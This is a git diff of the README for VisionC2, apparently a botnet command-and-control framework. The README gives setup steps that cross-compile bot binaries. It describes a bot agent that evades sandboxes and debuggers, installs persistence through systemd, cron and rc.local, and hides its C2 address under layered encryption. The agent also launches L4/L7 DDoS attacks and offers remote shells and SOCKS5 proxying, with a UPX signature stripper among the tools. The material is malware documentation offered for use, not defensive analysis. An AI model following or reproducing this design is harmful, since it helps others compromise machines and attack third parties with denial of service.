@@ -10,8 +10,7 @@
 
 [![Architecture](https://img.shields.io/badge/Full_Architecture-Documentation-blueviolet?style=for-the-badge)](Docs/ARCHITECTURE.md)
 [![Changelog](https://img.shields.io/badge/Full_ChangeLog-Documentation-blueviolet?style=for-the-badge)](Docs/CHANGELOG.md)
-
-<img width="1189" height="747" alt="image" src="https://github.com/user-attachments/assets/e0ca5692-5ba9-4f15-be48-877c20026cdf" />
+<img width="907" height="840" alt="image" src="https://github.com/user-attachments/assets/5013c6de-7ac0-4ef8-9aaa-3900c7558b16" />
 
 </div>
 
@@ -35,8 +34,8 @@
 ---
 
 ## Attack Methods
-<img width="1183" height="869" alt="image" src="https://github.com/user-attachments/assets/9b08df61-6280-40b2-9baf-a9840ca1887c" />
 
+<img width="1183" height="869" alt="image" src="https://github.com/user-attachments/assets/9b08df61-6280-40b2-9baf-a9840ca1887c" />
 
 <details>
 <summary><b>Layer 4 — Network/Transport</b></summary>
@@ -69,7 +68,6 @@
 
 <img width="1179" height="586" alt="image" src="https://github.com/user-attachments/assets/06f7ca4c-3119-4cd3-81dd-2224d131c290" />
 
-
 ## Installation
 
 ### Prerequisites
@@ -91,6 +89,7 @@ go version  # verify installation
 ### Quick Setup
 
 1. **Clone the repository**
+
    ```bash
    git clone https://github.com/Syn2Much/VisionC2.git
    cd VisionC2
@@ -98,15 +97,16 @@ go version  # verify installation
    ```
 
 2. **Run interactive setup**
+
    ```bash
    python3 setup.py
    ```
+
    The setup script will:
    - Generate 4096-bit TLS certificates
    - Create encryption keys and configuration
    - Cross-compile binaries for all supported architectures
    - Build the C2 server binary
-<img width="806" height="831" alt="image" src="https://github.com/user-attachments/assets/cce1edb2-01b3-4786-a59e-b16e5511f8af" />
 
 3. **Output locations**
 
@@ -123,17 +123,21 @@ go version  # verify installation
 ### Starting the C2 Server
 
 **Option 1: TUI Mode (Recommended)**
+
 ```bash
 screen ./server
 ```
+
 - Detach: `Ctrl + A` → `D`
 - Reattach: `screen -r`
 
 **Option 2: Telnet/Multi-User Mode**
+
 ```bash
 screen ./server --split
 nc your-server-ip 1337
 ```
+
 - User database: `cnc/users.json`
 - Login keyword: configured during setup
 
@@ -141,79 +145,42 @@ nc your-server-ip 1337
 
 ## Architecture
 
-```text
-Bot Binary
-    │
-    ▼
-┌─────────────────────────────────────────┐
-│      Runtime Decryption                 │
-│  - AES-128-CTR decrypt all sensitive    │
-│    strings from config.go hex blobs     │
-│  - 16-byte key from split XOR functions │
-└─────────────────────────────────────────┘
-    │
-    ▼
-┌─────────────────────────────────────────┐
-│         Startup Sequence                │
-│  - Daemonization (fork + setsid)        │
-│  - Single-instance enforcement (PID)    │
-│  - Sandbox/VM/debugger detection        │
-│  - Persistence (systemd + cron + rc)    │
-│  - Metadata caching                     │
-└─────────────────────────────────────────┘
-    │
-    ▼
-┌─────────────────────────────────────────┐
-│      C2 Resolution & Connection         │
-│  - 6-layer C2 address decryption        │
-│  - DNS Chain (DoH → UDP → A → Raw)     │
-│  - TLS 1.3 Handshake                     │
-│  - HMAC challenge/response auth         │
-└─────────────────────────────────────────┘
-    │
-    ▼
-┌─────────────────────────────────────────┐
-│        Command Loop & Execution         │
-│  - Command dispatch                     │
-│  - L4/L7 attacks (10+ methods)          │
-│  - SOCKS5 proxy (RFC 1929 auth)         │
-│  - Remote shell / broadcast shell       │
-└─────────────────────────────────────────┘
-```
+### Two Main Components
+
+- **`cnc/`** — Command & Control server. Dual-listener architecture: TLS on port 443 for bot connections, Interactive TUI built with Bubble Tea. RBAC with four permission levels (Basic/Pro/Admin/Owner) defined in `users.json`.
+
+- **`bot/`** — Agent deployed to targets. Connects back to CNC over TLS 1.3. Lifecycle: decrypt config → daemonize → singleton lock → sandbox detection → install persistence → DNS-resolve C2 → connect with reconnect loop.
+
+### Key Source Files
+
+| File | Purpose |
+|------|---------|
+| `bot/config.go` | All configuration constants: obfuscated C2 address (`gothTits`), crypto seed, magic code, protocol version, encrypted string blobs |
+| `bot/connection.go` | TLS connection, multi-method DNS resolution chain (DoH → UDP → A record → raw) |
+| `bot/attacks.go` | All L4/L7 DDoS methods |
+| `bot/opsec.go` | AES encryption, key derivation, sandbox/VM/debugger detection |
+| `bot/persist.go` | Persistence via systemd, cron, rc.local |
+| `bot/socks.go` | SOCKS5 proxy with RFC 1929 auth |
+| `cnc/ui.go` | Bubble Tea TUI — all views, keybindings, rendering |
+| `cnc/cmd.go` | Command dispatch and routing to bots |
+| `cnc/connection.go` | Bot connection handling, TLS setup, heartbeat |
+| `cnc/miscellaneous.go` | RBAC, user authentication, utilities |
+
+### Shared Configuration (must match between bot and CNC)
+
+Three values in `bot/config.go` and `cnc/main.go` **must be identical** for communication to work:
+
+- `magicCode` / `MAGIC_CODE` — 16-char auth token
+- `protocolVersion` / `PROTOCOL_VERSION` — version string
+- `cryptSeed` — 8-char hex seed (bot-side only, used for C2 address decoding)
 
 ---
 
-## Project Structure
+## Encryption Architecture
 
-```
-VisionC2/
-├── setup.py                  # Interactive setup wizard
-├── server                    # Compiled CNC binary
-├── bot/                      # Bot agent
-│   ├── main.go               # Entry point, main loop
-│   ├── config.go             # All config vars + AES-encrypted sensitive strings
-│   ├── connection.go         # TLS, DNS resolution, auth, C2 handler
-│   ├── attacks.go            # L4/L7 DDoS methods + proxy support
-│   ├── opsec.go              # AES-128-CTR, RC4, key derivation, sandbox detection
-│   ├── persist.go            # Systemd, cron, rc.local persistence
-│   └── socks.go              # SOCKS5 proxy with RFC 1929 auth
-├── cnc/                      # CNC server
-│   ├── main.go               # TLS listener, server entry
-│   ├── cmd.go                # Command dispatch, help menus
-│   ├── ui.go                 # Bubble Tea TUI
-│   ├── connection.go         # Bot connection handler, auth, TLS config
-│   ├── miscellaneous.go      # RBAC, user auth
-│   └── certificates/         # TLS certs
-├── tools/
-│   ├── build.sh              # Cross-compile 14 architectures
-│   ├── crypto.go             # AES-128-CTR encrypt/decrypt/verify CLI
-│   ├── cleanup.sh            # Remove bot persistence from a machine
-│   └── deUPX.py              # UPX signature stripper
-├── bins/                     # Compiled bot binaries
-└── Docs/                     # Architecture, commands, usage, changelog
-```
-
----
+- **C2 address**: 5-layer encoding pipeline (MD5 checksum → byte substitution → RC4 → XOR rotating key → base64)
+- **Sensitive strings**: AES-128-CTR with key derived from 16 split functions. Encrypted at build time via `tools/crypto.go`, decrypted at runtime by `initSensitiveStrings()`
+- **Transport**: TLS 1.3 with self-signed certificates (generated by `setup.py` in `cnc/certificates/`)
 
 ## Documentation
 
